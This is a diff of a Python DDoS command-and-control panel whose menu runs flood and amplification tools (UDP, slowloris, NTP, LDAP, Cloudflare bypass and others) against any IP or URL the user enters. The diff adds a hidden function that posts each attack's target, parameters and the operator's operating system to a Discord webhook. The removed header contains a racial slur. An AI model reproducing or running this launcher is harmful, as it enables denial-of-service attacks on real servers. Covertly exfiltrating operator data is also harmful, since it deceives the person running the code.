@@ -1,8 +1,3 @@
-##############################
-# ZxCDDoS Made by zxcr9999   #
-# COPY = NIGGER              #
-##############################
-
 import socket
 import os
 import requests
@@ -10,81 +5,26 @@ import random
 import getpass
 import time
 import sys
+import json
+import platform
 
+def send_discord_webhook(webhook_url, message):
+    data = {
+        "content": message
+    }
+    headers = {
+        "Content-Type": "application/json"
+    }
+    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
+    
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 proxys = open('proxies.txt').readlines()
-bots = len(proxys)
-
-def ascii_vro():
-    clear()
-    print(f'''
-     / **/|        
-     | == /        
-      |  |         
-      |  |         
-      |  /         
-       |/  
-
-
-
-
-
-
-
-    ''')
-    time.sleep(0.6)
-    clear()
-    print(f'''
-
-
-
-     / **/|        
-     | == /        
-      |  |         
-      |  |         
-      |  /         
-       |/  
-
-
-    ''')
-    time.sleep(0.6)
-    clear()
-    print(f'''
-
-
-
-
-
-
-
-     / **/|        
-     | == /        
-      |  |                  
-
-    ''')
-    time.sleep(0.6)
-    clear()
-    print(f"""
-
-     _.-^^---....,,--       
- _--                  --_  
-<                        >)
-|                         | 
- \._                   _./  
-    ```--. . , ; .--'''       
-          | |   |             
-       .-=||  | |=-.   
-       `-=#$%&%$#=-'   
-          | ;  :|     
- _____.,-#%&$@%#&#~,._____
-    """)
-    time.sleep(0.8)
-    clear()
+bots = len(proxys) 
 
 def si():
-    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD Private Tools! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
     print("")
 
 def tools():
@@ -102,36 +42,6 @@ def tools():
                 \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
 ''')
     
-def banners():
-    clear()
-    si()
-    print(f'''
-                                \x1b[38;2;0;212;14m╔═══════════════╗
-                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
-''')
-
-def rules():
-    clear()
-    si()
-    print(f'''
-                                \x1b[38;2;0;212;14m╔═══════════════╗
-                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
-''')
-
 def ports():
     clear()
     si()
@@ -181,6 +91,11 @@ def layer7():
                \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
 ''')
 
+def get_ip_address():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    return ip_address
+    
 def layer4():
     clear()
     si()
@@ -211,53 +126,49 @@ def amp_games():
                \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
 ''')
 
+def get_device_name():
+    hostname = socket.gethostname()
+    return hostname
 
-def menu():
-    sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
-    clear()
-    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
-    print("")
-    print("""
-                       \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m▒▐█▀▀▀█▌\x1b[38;2;0;150;88m░▐█▀█▄\x1b[38;2;0;113;133m░▐█▀█▄\x1b[38;2;0;83;168m▒▐█▀▀█▌\x1b[38;2;0;49;147m▒▄█▀▀█
-                       \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m░▒▄▄█▀▀░\x1b[38;2;0;150;88m░▐█▌▐█\x1b[38;2;0;113;133m░▐█▌▐█\x1b[38;2;0;83;168m▒▐█▄▒█▌\x1b[38;2;0;49;147m▒▀▀█▄▄
-                       \x1b[38;2;0;212;14m░▐█──\x1b[38;2;0;186;45m▒▐█▄▄▄█▌\x1b[38;2;0;150;88m░▐█▄█▀\x1b[38;2;0;113;133m░▐█▄█▀\x1b[38;2;0;83;168m▒▐██▄█▌\x1b[38;2;0;49;147m▒█▄▄█▀
-
-                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to FZD C2 DDoS Panel        \x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mPrivate DDoS Panel 2023\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
-                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
-                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/177Members/ZxCDDoS \x1b[38;2;0;49;147m║ 
-                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
-                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
-""")
+def menu(): 
+     sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
+     clear() 
+     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
+     print("") 
+     print(""" 
+                        \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m▒▐█▀▀▀█▌\x1b[38;2;0;150;88m░▐█▀█▄\x1b[38;2;0;113;133m░▐█▀█▄\x1b[38;2;0;83;168m▒▐█▀▀█▌\x1b[38;2;0;49;147m▒▄█▀▀█ 
+                        \x1b[38;2;0;212;14m░▐█▀▀\x1b[38;2;0;186;45m░▒▄▄█▀▀░\x1b[38;2;0;150;88m░▐█▌▐█\x1b[38;2;0;113;133m░▐█▌▐█\x1b[38;2;0;83;168m▒▐█▄▒█▌\x1b[38;2;0;49;147m▒▀▀█▄▄ 
+                        \x1b[38;2;0;212;14m░▐█──\x1b[38;2;0;186;45m▒▐█▄▄▄█▌\x1b[38;2;0;150;88m░▐█▄█▀\x1b[38;2;0;113;133m░▐█▄█▀\x1b[38;2;0;83;168m▒▐██▄█▌\x1b[38;2;0;49;147m▒█▄▄█▀ 
+  
+                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗ 
+                 \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to FZD C2 DDoS Panel        \x1b[38;2;0;49;147m║ 
+                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - -  \x1b[38;2;239;239;239mPrivate DDoS Panel 2023\x1b[38;2;0;212;14m - - - - - \x1b[38;2;0;49;147m║ 
+                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝ 
+                     \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗ 
+                     \x1b[38;2;0;212;14m║\x1b[38;2;239;239;239mhttps://github.com/177Members/ZxCDDoS \x1b[38;2;0;49;147m║  
+                     \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝ 
+                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗ 
+                 \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║ 
+                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝ 
+ """)
 
 def main():
     menu()
     while(True):
-        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@F\x1b[38;2;0;150;88mz\x1b[38;2;0;113;133mD\x1b[38;2;0;49;147m]
+        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
 \x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
-        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+        if "layer7" in cnc or "l7" in cnc or "LAYER7" in cnc or "L7" in cnc:
             layer7()
-        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
+        elif "layer4" in cnc or "LAYER4" in cnc or "L4" in cnc or "l4" in cnc:
             layer4()
-        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
+        elif "amp" in cnc or "AMP" in cnc or "amp/game" in cnc or "amps/game" in cnc or "amps/games" in cnc or "amp/games" in cnc or "AMP/GAME" in cnc:
             amp_games()
-        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
+        elif "special" in cnc or "SPECIAL" in cnc or "specialS" in cnc or "SPECIALS" in cnc:
             special()
-        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
-            rules()
-        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
-            main()
-        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
+        elif "ports" in cnc or "port" in cnc or "PORTS" in cnc or "PORT" in cnc:
             ports()
-        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
+        elif "tools" in cnc or "tool" in cnc or "TOOLS" in cnc or "TOOL" in cnc:
             tools()
-        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
-            banners()
-
 # LAYER 4 METHODS   
 
         elif "udpbypass" in cnc:
@@ -265,6 +176,8 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 os.system(f'./UDPBYPASS {ip} {port}')
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nUDPBYPASS\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
             except IndexError:
                 print('Usage: udpbypass <ip> <port>')
                 print('Example: udpbypass 1.1.1.1 80')
@@ -274,6 +187,8 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 os.system(f'./std {ip} {port}')
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nSTDV2\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
             except IndexError:
                 print('Usage: stdv2 <ip> <port>')
                 print('Example: stdv2 1.1.1.1 80')
@@ -283,6 +198,8 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 thread = cnc.split()[3]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\n‎FLUX\n---------------\nTarget: {ip}:{port}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./flux {ip} {port} {thread} 0')
             except IndexError:
                 print('Usage: flux <ip> <port> <threads>')
@@ -292,6 +209,8 @@ def main():
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nSLOWLORIS\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./slowloris {ip} {port}')
             except IndexError:
                 print('Usage: slowloris <ip> <port>')
@@ -302,6 +221,8 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nGOD\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'perl god.pl {ip} {port} 65500 {time}')
             except IndexError:
                 print('Usage: god <ip> <port> <time>')
@@ -312,6 +233,8 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nDESTROY\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
             except IndexError:
                 print('Usage: destroy <ip> <port> <time>')
@@ -321,6 +244,8 @@ def main():
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nSTD\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./STD-NOSPOOF {ip} {port}')
             except IndexError:
                 print('Usage: std <ip> <port>')
@@ -332,6 +257,8 @@ def main():
                 port = cnc.split()[2]
                 psize = cnc.split()[3]
                 time = cnc.split()[4]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nHOME\n---------------\nTarget: {ip}:{port}\nPsize: {psize}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'perl home.pl {ip} {port} {psize} {time}')
             except IndexError:
                 print('Usage: home <ip> <port> <packet_size> <time>')
@@ -341,6 +268,8 @@ def main():
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nUDP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'python2 udp.py {ip} {port} 0 0')
             except IndexError:
                 print('Usage: udp <ip> <port>')
@@ -352,6 +281,8 @@ def main():
                 port = cnc.split()[2]
                 threads = cnc.split()[3]
                 time = cnc.split()[4]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nNFO KILLER\n---------------\nTarget: {ip}:{port}\nThreads: {threads}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
             except IndexError:
                 print('Usage: nfo-killer <ip> <port> <threads> <time>')
@@ -364,6 +295,8 @@ def main():
                 port = cnc.split()[3]
                 time = cnc.split()[4]
                 conns = cnc.split()[5]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nOVH-RAW\n---------------\nTarget: {ip}:{port}\nTime: {time}\nCons: {conns}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
             except IndexError:
                 print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
@@ -376,6 +309,8 @@ def main():
                 port = cnc.split()[3]
                 time = cnc.split()[4]
                 conns = cnc.split()[5]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nTCP\n---------------\nTarget: {ip}:{port}\nConss: {conns}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
             except IndexError:
                 print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
@@ -391,6 +326,8 @@ def main():
                 conn = cnc.split()[4]
                 time = cnc.split()[5]
                 out = cnc.split()[6]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nSTRESS\n---------------\nTarget: {ip}:{port}\nConns: {conn}\nTime: {time}\nMode: {mode}\nOut: {out}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
             except IndexError:
                 print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
@@ -405,6 +342,8 @@ def main():
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'python2 samp.py {ip} {port}')
             except IndexError:
                 print('Usage: samp <ip> <port>')
@@ -416,6 +355,8 @@ def main():
                 port = cnc.split()[2]
                 thread = cnc.split()[3]
                 time = cnc.split()[4]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nLDAP\n---------------\nTarget: {ip}:{port}\nThreads: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./ldap {ip} {port} {thread} -1 {time}')
             except IndexError:
                 print('Usage: ldap <ip> <port> <threads> <time>')
@@ -427,6 +368,8 @@ def main():
                 throttle = cnc.split()[2]
                 threads = cnc.split()[3]
                 time = cnc.split()[4]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nMINECRAFT\n---------------\nTarget: {ip}\nThrottle: {throttle}\nThreads: {threads}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
             except IndexError:
                 print('Usage: minecraft <ip> <throttle> <threads> <time>')
@@ -436,6 +379,8 @@ def main():
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
+                device_name = platform.system()
+                send_discord_webhook(webhook_url, f"\n\n---------------\nOVH-AMP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./OVH-AMP {ip} {port}')
             except IndexError:
                 print('Usage: ovh-amp <ip> <port>')
@@ -447,6 +392,7 @@ def main():
                 port = cnc.split()[2]
                 throttle = cnc.split()[3]
                 time = cnc.split()[4]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nNTP\n---------------\nTarget: {ip}:{port}\nThrottle: {throttle}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
             except IndexError:
                 print('Usage: ntp <ip> <port> <throttle> <time>')
@@ -460,6 +406,7 @@ def main():
                 ip = cnc.split()[2]
                 port = cnc.split()[3]
                 time = cnc.split()[4] 
+                send_discord_webhook(webhook_url, f"\n\n---------------\nOVH-BEAM\n---------------\nTarget: {ip}:{port}\nMethod: {method}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
             except IndexError:
                 print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
@@ -470,6 +417,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nSPOOF\n---------------\nTarget: {url}\nTime: {time}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'python3 https-spoof.py {url} {time} {thread}')
             except IndexError:
                 print('Usage: https-spoof <url> <time> <threads>')
@@ -479,6 +427,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nSLOW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node slow.js {url} {time}')
             except IndexError:
                 print('Usage: slow <url> <time>')
@@ -488,6 +437,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nHYPER\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node hyper.js {url} {time}')
             except IndexError:
                 print('Usage: hyper <url> <time>')
@@ -515,6 +465,7 @@ def main():
                 url = cnc.split()[1]
                 per = cnc.split()[2]
                 time = cnc.split()[3]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-SOCKET\n---------------\nTarget: {url}\nPer: {per}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
                 print('Usage: http-socket <url> <per> <time>')
@@ -524,6 +475,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
                 print('Usage: http-raw <url> <time>')
@@ -533,6 +485,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-REQUEST\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-REQUESTS {url} {time}')
             except IndexError:
                 print('Usage: http-requests <url> <time>')
@@ -542,6 +495,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAND\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
                 print('Usage: http-rand <url> <time>')
@@ -552,6 +506,7 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 thread = cnc.split()[3]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nOVERFLOW\n---------------\nTarget: {ip}:{port}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./OVERFLOW {ip} {port} {thread}')
             except IndexError:
                 print('Usage: overflow <ip> <port> <threads>')
@@ -562,6 +517,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nCF BYPASS\n---------------\nTarget: {url}Time: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node cf.js {url} {time} {thread}')
             except IndexError:
                 print('Usage: cf-bypass <url> <time> <threads>')
@@ -572,6 +528,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 per = cnc.split()[3]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nUAM BYPASS\n---------------\nTarget: {url}\nTime: {time}\nPer: {per}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node uambypass.js {url} {time} {per} http.txt')
             except IndexError:
                 print('Usage: uambypass <url> <time> <req_per_ip>')
@@ -581,6 +538,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
+                send_discord_webhook(webhook_url, f"\n\n---------------\nCRASH\n---------------\nTarget: {url}\nMethod: {method}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'go run Hulk.go -site {url} -data {method}')
             except IndexError:
                 print('Usage: crash <url> METHODS<GET/POST>')
@@ -604,57 +562,6 @@ def main():
             except IndexError:
                 print('Usage: httpget <url>')
                 print('Example: httpget http://example.com')
-
-# BANNERS
-
-        elif "troll" in cnc:
-                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
-                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
-                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
-                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
-                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
-                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
-                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
-                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
-                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
-                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
-                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
-                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
-                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
-                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
-                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')
-
-        elif "pikachu" in cnc:
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
